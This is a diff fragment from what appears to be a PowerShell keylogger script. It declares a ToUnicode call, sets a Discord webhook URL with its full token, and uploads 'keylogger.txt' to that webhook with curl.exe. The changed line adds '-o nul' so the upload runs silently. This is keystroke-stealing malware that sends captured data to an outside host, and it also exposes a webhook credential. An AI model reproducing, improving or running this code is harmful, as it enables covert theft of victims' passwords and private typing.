@@ -65,7 +65,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 	
     $hookUrl = 'https://discord.com/api/webhooks/1130234959148359771/Qn5KRieuzWJHcn4MTezMzadO4mt6uRAGkt40RdRTQ7rojQvzHIfKVC83p-DV6eqYYSj7'
 	
-    curl.exe -F 'file1=@keylogger.txt' $hookurl
+    curl.exe -F 'file1=@keylogger.txt' $hookurl -o nul
     
     Start-Sleep -Milliseconds 50
 	    
